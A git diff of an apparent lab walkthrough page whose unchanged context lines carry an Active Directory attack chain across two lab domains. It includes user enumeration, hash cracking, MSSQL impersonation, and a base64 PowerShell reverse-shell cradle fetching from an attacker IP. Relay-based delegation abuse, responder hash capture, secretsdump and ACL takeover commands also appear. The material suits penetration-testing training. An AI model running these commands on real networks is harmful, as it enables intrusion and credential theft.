@@ -2,7 +2,7 @@
 
 ## Attack path visualized
 
-![](<../../../../.gitbook/assets/image (68) (1).png>)
+![](<../../../.gitbook/assets/image (68) (1).png>)
 
 ### 1. Enumerate Users
 
@@ -24,7 +24,7 @@ git clone https://github.com/danielmiessler/SecLists
 ./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
 ```
 
-![](<../../../../.gitbook/assets/image (72) (1) (1).png>)
+![](<../../../.gitbook/assets/image (72) (1) (1).png>)
 
 3\. To only get a list of usernames execute the following which will cut the output to only get the usernames, changes everything to lowercase and sorting for unique entries:
 
@@ -63,11 +63,11 @@ Other attacks which are possible to do is password spraying or checking if the u
 GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
 ```
 
-![](<../../../../.gitbook/assets/image (9) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1).png>)
 
 2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash:
 
-![](<../../../../.gitbook/assets/image (67) (1).png>)
+![](<../../../.gitbook/assets/image (67) (1).png>)
 
 3\. We can crack the hash with Hashcat. I transfered the file to my host since cracking in a VM isn't really ideal, it can't use the GPU then. I always run hashcat with rockyou and the dive ruleset.
 
@@ -75,7 +75,7 @@ GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -o
 .\hashcat.exe -a 0 -m 18200 .\asreproasting.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
 ```
 
-![](<../../../../.gitbook/assets/image (34).png>)
+![](<../../../.gitbook/assets/image (34).png>)
 
 4\. I cracked the hash within seconds and we gained access to the domain as `Richard` with the password `Sample123`.
 
@@ -88,19 +88,19 @@ git clone https://github.com/fox-it/BloodHound.py
 bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.local -u 'Richard' -p 'Sample123' --zip -c all
 ```
 
-![](<../../../../.gitbook/assets/image (2) (1).png>)
+![](<../../../.gitbook/assets/image (2) (1).png>)
 
 2\. We now can load the data into BloodHound by draggin the zip file into it and see if Richard can do anything usefull:
 
-![](<../../../../.gitbook/assets/image (62) (1) (1).png>)
+![](<../../../.gitbook/assets/image (62) (1) (1).png>)
 
 Richard is member of the following groups, nothing interesting there:
 
-![](<../../../../.gitbook/assets/image (66) (1) (1).png>)
+![](<../../../.gitbook/assets/image (66) (1) (1).png>)
 
 The attributes of the user also doesn't show anything interesting:
 
-![](<../../../../.gitbook/assets/image (15) (1) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1).png>)
 
 ### 3. Access SQL Server
 
@@ -110,7 +110,7 @@ The attributes of the user also doesn't show anything interesting:
 
 To check if a user can access any systems I like to use [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec). This tool can check if the user can authenticate to a list of targets using smb, winrm, mssql and ldap. It also supports ssh. This is a snippet from the help function:
 
-![](<../../../../.gitbook/assets/image (47).png>)
+![](<../../../.gitbook/assets/image (47).png>)
 
 1. We can check if the user can access anything over SMB, which by default a domain user can. If the user is local admin (which is what we need to really do anything over SMB, it will show Pwn3d!).
 
@@ -118,7 +118,7 @@ To check if a user can access any systems I like to use [Crackmapexec](https://g
 crackmapexec smb 10.0.0.0/24 -u richard -p Sample123
 ```
 
-![](<../../../../.gitbook/assets/image (56) (1).png>)
+![](<../../../.gitbook/assets/image (56) (1).png>)
 
 It can access three hosts over SMB but unfortunately we aren't local admin to any of them. We can still check for any accessible shares by adding the `--shares` parameter.
 
@@ -126,11 +126,11 @@ It can access three hosts over SMB but unfortunately we aren't local admin to an
 crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
 ```
 
-![](<../../../../.gitbook/assets/image (54).png>)
+![](<../../../.gitbook/assets/image (54).png>)
 
 After connecting to the share we see that this user can't access any of the subdirectories:
 
-![](<../../../../.gitbook/assets/image (73) (1) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1) (1).png>)
 
 2\. Next we can check if the user can access any systems over winrm:
 
@@ -138,7 +138,7 @@ After connecting to the share we see that this user can't access any of the subd
 crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
 ```
 
-![](<../../../../.gitbook/assets/image (32) (1).png>)
+![](<../../../.gitbook/assets/image (32) (1).png>)
 
 3\. We weren't able to authenticate to any machine over winrm. Now we check for SQL server with the mssql protocol:
 
@@ -146,7 +146,7 @@ crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
 crackmapexec mssql 10.0.0.0/24 -u richard -p Sample123
 ```
 
-![](<../../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1).png>)
 
 Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he isn't sysadmin yet.
 
@@ -156,7 +156,7 @@ Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he isn'
 mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
 ```
 
-![](<../../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1).png>)
 
 ### 4. Become sysadmin
 
@@ -169,7 +169,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../../.gitbook/assets/image (29).png>)
+![](<../../../.gitbook/assets/image (29).png>)
 
 2\. The 0 means we aren't sysadmin. So we have to find a way to become sysadmin. One of the ways I know of is checking if our user can impersonate any other user which we can check with the following querie:
 
@@ -181,7 +181,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-![](<../../../../.gitbook/assets/image (14) (1) (1).png>)
+![](<../../../.gitbook/assets/image (14) (1) (1).png>)
 
 3\. Seems like we can impersonate a User with the name Developer. We can do this with the following querie:
 
@@ -191,7 +191,7 @@ EXECUTE AS LOGIN = 'Developer'
 
 But we get an error, because the user Developer can't use the database we are currently connected to:&#x20;
 
-![](<../../../../.gitbook/assets/image (45) (1).png>)
+![](<../../../.gitbook/assets/image (45) (1).png>)
 
 We can change the database to master; and try it again:
 
@@ -200,7 +200,7 @@ use master;
 EXECUTE AS LOGIN = 'Developer'
 ```
 
-![](<../../../../.gitbook/assets/image (39) (1).png>)
+![](<../../../.gitbook/assets/image (39) (1).png>)
 
 Seems like it worked, lets run the query again to check which user we are and if we are sysadmin:
 
@@ -209,7 +209,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../../.gitbook/assets/image (18).png>)
+![](<../../../.gitbook/assets/image (18) (1).png>)
 
 4\. We impersonated the user Developer but still aren't sysadmin. We can check for impersonation permissions agains with the same query:
 
@@ -221,7 +221,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-![](<../../../../.gitbook/assets/image (20) (1).png>)
+![](<../../../.gitbook/assets/image (20) (1).png>)
 
 5\. We can now try to impersonate `sa`, but we get an error:
 
@@ -229,7 +229,7 @@ WHERE a.permission_name = 'IMPERSONATE'
 EXECUTE AS LOGIN = 'sa'
 ```
 
-![](<../../../../.gitbook/assets/image (46) (1) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1) (1).png>)
 
 6\. Lets try to impersonate `developer_test` and then check for sysadmin privileges and if impersonation is possible again:
 
@@ -244,7 +244,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-![](<../../../../.gitbook/assets/image (36).png>)
+![](<../../../.gitbook/assets/image (36).png>)
 
 7\. Seems like we can finally impersonate `sa` now.
 
@@ -254,7 +254,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../../.gitbook/assets/image (61) (1).png>)
+![](<../../../.gitbook/assets/image (61) (1).png>)
 
 8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server.
 
@@ -268,7 +268,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![](<../../../../.gitbook/assets/image (11) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1).png>)
 
 2\. We receive an error that it is disabled. But we can try to enable it with the following querie:
 
@@ -279,11 +279,11 @@ EXEC sp_configure 'xp_cmdshell',1
 RECONFIGURE
 ```
 
-![](<../../../../.gitbook/assets/image (10).png>)
+![](<../../../.gitbook/assets/image (10).png>)
 
 Now we can try to execute the whoami command again and it worked:
 
-![](<../../../../.gitbook/assets/image (63) (1).png>)
+![](<../../../.gitbook/assets/image (63) (1).png>)
 
 3\. The next step is to gain a shell from WEB01. For this we need to prepare some files and setup a listerener before we execute a querie on the sql server.&#x20;
 
@@ -294,7 +294,7 @@ Now we can try to execute the whoami command again and it worked:
 * Start a webserver on port 8090: `python3 -m http.server 8090`
 * Start a listener on port 443: `nc -lvp 443`
 
-![](<../../../../.gitbook/assets/image (35) (1).png>)
+![](<../../../.gitbook/assets/image (35) (1).png>)
 
 4\. Now we need to change/type the payload we want to execute on the sql server. A method I learned to use is base64 encode the command we want to execute and use the -enc parameter inside PowerShell. This prevents a lot of issues with single and double qoutes.
 
@@ -311,7 +311,7 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:809
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
 
-![](<../../../../.gitbook/assets/image (71) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
 
 * Now we can paste the base64 encoded string in the following querie:
 
@@ -323,7 +323,7 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA
 
 5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded and the shell comes in from `WEB01` as `NT service\mssql$dev`:
 
-![](<../../../../.gitbook/assets/image (16) (1) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1).png>)
 
 ### 6. Privesc RBCD
 
@@ -342,7 +342,7 @@ One of the privilege escalation techniques that you don't see so much is doing a
 crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
 ```
 
-![](<../../../../.gitbook/assets/image (71) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1).png>)
 
 2\. The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain. So lets add our own computerobject, this can be done with PowerMad. First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
 
@@ -356,7 +356,7 @@ Now we can load it into the PowerShell session in the shell:
 iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
 ```
 
-![](<../../../../.gitbook/assets/image (24).png>)
+![](<../../../.gitbook/assets/image (24) (1).png>)
 
 Then we can create our own computerobject with the name `FAKE01` and password `123456`.
 
@@ -364,7 +364,7 @@ Then we can create our own computerobject with the name `FAKE01` and password `1
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (73) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1).png>)
 
 3\. The third requirement is that the WebDav director is installed. We can check this with the following PowerShell command in the shell:
 
@@ -372,7 +372,7 @@ New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '12
 Get-WindowsFeature WebDAV-Redirector
 ```
 
-![](<../../../../.gitbook/assets/image (14) (1).png>)
+![](<../../../.gitbook/assets/image (14) (1).png>)
 
 4\. The last requirement is to create a DNS record back to our attacking machine, since the webdav connection won't work without a hostname to connect to. For this we need the [Invoke-DNSUpdate](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1) script from PowerMad. So we download it again and import it in the shell and then run the command to add the dns entry `webdav.amsterdam.bank.local` to our attacking machine IP:
 
@@ -385,7 +385,7 @@ iex (iwr http://192.168.248.2:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
 Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.2 -Realm amsterdam.bank.local
 ```
 
-![](<../../../../.gitbook/assets/image (11).png>)
+![](<../../../.gitbook/assets/image (11).png>)
 
 I also did a nslookup to check if the DNS record was created. The domain controller at 10.0.0.3 responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.
 
@@ -395,7 +395,7 @@ I also did a nslookup to check if the DNS record was created. The domain control
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
-![](<../../../../.gitbook/assets/image (5) (1).png>)
+![](<../../../.gitbook/assets/image (5) (1).png>)
 
 6\. Next we need to download en load the Change-LockScreen.ps1 script from the nccgroup and load it into memory on the target:
 
@@ -414,7 +414,7 @@ Lets force the webdav request:
 change-lockscreen -webdav \\webdav@80\
 ```
 
-![](<../../../../.gitbook/assets/image (74) (1).png>)
+![](<../../../.gitbook/assets/image (74) (1).png>)
 
 Once we check our ntlmrelay tool output we see that it succesfully authenticated as WEB01$ to the LDAP port on the DC at `10.0.0.3`. And it says `FAKE01` can now impersonate users on `WEB01`.
 
@@ -424,7 +424,7 @@ Once we check our ntlmrelay tool output we see that it succesfully authenticated
 getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
 ```
 
-![](<../../../../.gitbook/assets/image (33).png>)
+![](<../../../.gitbook/assets/image (33).png>)
 
 8\. Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.
 
@@ -433,13 +433,13 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass web01.amsterdam.bank.local
 ```
 
-![](<../../../../.gitbook/assets/image (1) (1).png>)
+![](<../../../.gitbook/assets/image (1) (1).png>)
 
 We retrieved the hash of the local administrator user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to WEB01. We can do this with our good old tool crackmapexec.
 
 9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from impacket, well because Defender will block it:
 
-![](<../../../../.gitbook/assets/image (37).png>)
+![](<../../../.gitbook/assets/image (37).png>)
 
 As said before, we can use the local administrator hash with Crackmapexec and execute commands with the `-x` flag.
 
@@ -447,7 +447,7 @@ As said before, we can use the local administrator hash with Crackmapexec and ex
 crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x whoami
 ```
 
-![](<../../../../.gitbook/assets/image (72).png>)
+![](<../../../.gitbook/assets/image (72).png>)
 
 That worked, but how can we get a shell? You remember the payload we generated to get a shell through SQL server. That will work here too. So lets copy that and place it in the x parameter.
 
@@ -456,7 +456,7 @@ nc -lvp 443
 crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
 ```
 
-![](<../../../../.gitbook/assets/image (55) (1).png>)
+![](<../../../.gitbook/assets/image (55) (1).png>)
 
 And we received a shell as the local administrator. Gotta love PowerShell :)
 
@@ -466,7 +466,7 @@ And we received a shell as the local administrator. Gotta love PowerShell :)
 
 1. We now fully own the server web01 which runs as a SQL Server. During our enumeration we didn't check for any SQL Links. We could do this manually in our connected mssqlclient.py session, but we could also use HeidiSQL from our Windows 10 machine. You might wonder why, but I prefer to use heidisql, especially with bigger queries and data returned. mssqlclient.py for example returns these things like:
 
-![](<../../../../.gitbook/assets/image (70) (1).png>)
+![](<../../../.gitbook/assets/image (70) (1).png>)
 
 To do this we need to setup a port forward since our Windows 10 machine isn't connected to the lab. We can do this with socat. This will make our kali listen on port `1433` and redirect all traffic to `WEB01` (`10.0.0.5`) port `1433`. The SQL Server is running on default on port 1433.
 
@@ -486,7 +486,7 @@ runas /netonly /user:amsterdam\richard c:\Tools\AD\HeidiSQL_11.3_64_Portable\hei
 
 Then we can connect to the database using the following setup:
 
-![](<../../../../.gitbook/assets/image (68).png>)
+![](<../../../.gitbook/assets/image (68).png>)
 
 {% hint style="info" %}
 For this to work you will need to fill in the IP of your kali machine, which need to be in the same network as the Windows 10 machine.
@@ -498,7 +498,7 @@ For this to work you will need to fill in the IP of your kali machine, which nee
 SELECT * FROM master..sysservers;
 ```
 
-![](<../../../../.gitbook/assets/image (71) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1).png>)
 
 3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server with the following query, using the openquery functionality:
 
@@ -506,7 +506,7 @@ SELECT * FROM master..sysservers;
 SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
 ```
 
-![](<../../../../.gitbook/assets/image (61).png>)
+![](<../../../.gitbook/assets/image (61).png>)
 
 4\. We can also query the server to check if xp\_cmdshell is on so we can execute commands:
 
@@ -514,7 +514,7 @@ SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
 SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
 ```
 
-![](<../../../../.gitbook/assets/image (56).png>)
+![](<../../../.gitbook/assets/image (56).png>)
 
 Unfortunatelly it isn't enabled. We could try to enable it (and that works too if you configured it). But that is'n't the intended way for the attack path.
 
@@ -530,7 +530,7 @@ SQL Servers by default runs as a local service under the context of the computer
 sudo responder -I tun0
 ```
 
-![](<../../../../.gitbook/assets/image (69).png>)
+![](<../../../.gitbook/assets/image (69) (1).png>)
 
 2\. The next step is to perform a UNC Path injection attack. One SQL function we can use for that is `xp_dirtree`. We can try the UNC Path injection with the following query in HeidiSQL, using the EXEC AT method to execute something through the link:
 
@@ -538,11 +538,11 @@ sudo responder -I tun0
 EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
 ```
 
-![](<../../../../.gitbook/assets/image (5).png>)
+![](<../../../.gitbook/assets/image (5).png>)
 
 3\. If we check our Responder output we can see that we captured the hash from the user `sa_sql` from the domain `Secure`.
 
-![](<../../../../.gitbook/assets/image (38).png>)
+![](<../../../.gitbook/assets/image (38).png>)
 
 ### 9. Crack SQL account hash
 
@@ -554,7 +554,7 @@ EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
 .\hashcat.exe -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
 ```
 
-![](<../../../../.gitbook/assets/image (30).png>)
+![](<../../../.gitbook/assets/image (30).png>)
 
 We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou2`.
 
@@ -568,7 +568,7 @@ We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou
 nslookup secure.local
 ```
 
-![](<../../../../.gitbook/assets/image (65) (1).png>)
+![](<../../../.gitbook/assets/image (65) (1).png>)
 
 2\. The IP for secure.local is `10.0.0.100`, we can quickly run Crackmapexec and see if we can connect to it over SMB:
 
@@ -576,7 +576,7 @@ nslookup secure.local
 crackmapexec smb 10.0.0.100
 ```
 
-![](<../../../../.gitbook/assets/image (64).png>)
+![](<../../../.gitbook/assets/image (64).png>)
 
 3\. The hostname is `DC03`, and the machine is part of `secure.local`. We probably found the domain controller. Lets run BloodHound with the gathered credentials to retrieve the domain data:
 
@@ -584,23 +584,23 @@ crackmapexec smb 10.0.0.100
 bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sql' -p 'Iloveyou2' --zip -c all
 ```
 
-![](<../../../../.gitbook/assets/image (26).png>)
+![](<../../../.gitbook/assets/image (26).png>)
 
 We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:
 
-![](<../../../../.gitbook/assets/image (13) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1) (1).png>)
 
 4\. Click on the user and scroll down in the "Node Info" till the "Outbound Control Rights" section. If there is any data here, it means the object has control on another object. Lets click on the number "1".
 
-![](<../../../../.gitbook/assets/image (66) (1).png>)
+![](<../../../.gitbook/assets/image (66) (1).png>)
 
 We see that the user has WriteOwner permissions:
 
-![](<../../../../.gitbook/assets/image (67).png>)
+![](<../../../.gitbook/assets/image (67).png>)
 
 In BloodHound you can right click the Edge and click the ?Help function to get more information on how to abuse it:
 
-![](<../../../../.gitbook/assets/image (13) (1) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1).png>)
 
 5\. One tool to do these ACL abuses is [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) from PowerSploit. So lets download that and load it into memory in the shell we have on `WEB01`.
 
@@ -618,7 +618,7 @@ $creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_s
 
 The credentials are saved in the `$creds` variable now:
 
-![](<../../../../.gitbook/assets/image (46) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1).png>)
 
 6\. Now we can use PowerView to query the domain controller from `secure.local` for the domain-object `DATA01` and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve as well;
 
@@ -627,7 +627,7 @@ Get-DomainObject -Identity data01 -SecurityMasks Owner -Domain secure.local -Cre
 Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain secure.local -Credential $creds -Server 10.0.0.100
 ```
 
-![](<../../../../.gitbook/assets/image (73).png>)
+![](<../../../.gitbook/assets/image (73).png>)
 
 7\. The current owner of `DATA01` is the Domain Admins group. Lets change that. We can change the owner of the object using the `Set-DomainObjectOwner` cmdlet. The command below will change the owner to `sa_sql`.
 
@@ -635,11 +635,11 @@ Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain 
 Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100 -Identity DATA01 -OwnerIdentity sa_sql -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (43).png>)
+![](<../../../.gitbook/assets/image (43).png>)
 
 We didn't received any output, but we can execute the commands again to see who the owner is now.
 
-![](<../../../../.gitbook/assets/image (19).png>)
+![](<../../../.gitbook/assets/image (19).png>)
 
 The owner successfully changed.
 
@@ -649,11 +649,11 @@ The owner successfully changed.
 Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure.local -TargetIdentity DATA01 -PrincipalDomain secure.local -PrincipalIdentity sa_sql -Rights All -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (16) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1).png>)
 
 9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:
 
-![](<../../../../.gitbook/assets/image (65).png>)
+![](<../../../.gitbook/assets/image (65).png>)
 
 10\. We have a lot of permissions now. Since `DATA01` doesn't have LAPS installed unfortunately, we need to execute another Resource Based Constrained Delegation attack. The one known as the computer object takeover. To execute this attack there are two requirements:
 
@@ -666,7 +666,7 @@ Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure
 crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
 ```
 
-![](<../../../../.gitbook/assets/image (12).png>)
+![](<../../../.gitbook/assets/image (12).png>)
 
 Then create a credential object, load PowerMad and add a computerobject to the domain:
 
@@ -677,7 +677,7 @@ iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.0.0.100 -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (66).png>)
+![](<../../../.gitbook/assets/image (66).png>)
 
 We successfully created the computerobject `FAKE01` in the `secure.local` domain.
 
@@ -688,7 +688,7 @@ iex (iwr http://192.168.248.2:8090/PowerView.ps1 -usebasicparsing)
 Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Data01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 ```
 
-![](<../../../../.gitbook/assets/image (32).png>)
+![](<../../../.gitbook/assets/image (32).png>)
 
 13\. The attribute haven't been set. Before we can write to it, we need to prepare the descriptor. First we need to get the SID of the computerobject `FAKE01` which we created. We can request this with PowerView:
 
@@ -696,7 +696,7 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Da
 Get-DomainComputer fake01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Select-Object samaccountname, objectsid
 ```
 
-![](<../../../../.gitbook/assets/image (70).png>)
+![](<../../../.gitbook/assets/image (70).png>)
 
 Now we need to create the raw security descriptor which we then will write to the attribute:
 
@@ -706,7 +706,7 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-![](<../../../../.gitbook/assets/image (16).png>)
+![](<../../../.gitbook/assets/image (16).png>)
 
 14\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:
 
@@ -714,11 +714,11 @@ $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Set-DomainObject -Domain secure.local -Credential $creds -Server 10.0.0.100 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (15).png>)
+![](<../../../.gitbook/assets/image (15).png>)
 
 We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:
 
-![](<../../../../.gitbook/assets/image (75).png>)
+![](<../../../.gitbook/assets/image (75).png>)
 
 Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some PowerShell confu to decrypt it:
 
@@ -728,7 +728,7 @@ $RawBytes = Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -S
 Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-1-5-21-1498997062-1091976085-892328878-1601 | Select-Object samaccountname
 ```
 
-![](<../../../../.gitbook/assets/image (74).png>)
+![](<../../../.gitbook/assets/image (74).png>)
 
 15\. The next step is to impersonate a user and request tickets so we can authenticate. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin Administrator using impackets getST.py script. Fill in the password `123456`.
 
@@ -736,7 +736,7 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-
 getST.py secure/FAKE01@10.0.0.100 -spn cifs/data01.secure.local -impersonate administrator -dc-ip 10.0.0.100
 ```
 
-![](<../../../../.gitbook/assets/image (71).png>)
+![](<../../../.gitbook/assets/image (71).png>)
 
 Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.
 
@@ -745,7 +745,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass data01.secure.local
 ```
 
-![](<../../../../.gitbook/assets/image (1).png>)
+![](<../../../.gitbook/assets/image (1).png>)
 
 16\. We retrieved the hash of the local administrator user. We can use the local admin hash though to authenticate to `DATA01`.&#x20;
 
@@ -753,7 +753,7 @@ secretsdump.py -k -no-pass data01.secure.local
 crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc -x whoami
 ```
 
-![](<../../../../.gitbook/assets/image (13) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1).png>)
 
 17\. We could get a shell the same way as we did before.
 
@@ -761,7 +761,7 @@ crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc
 crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
 ```
 
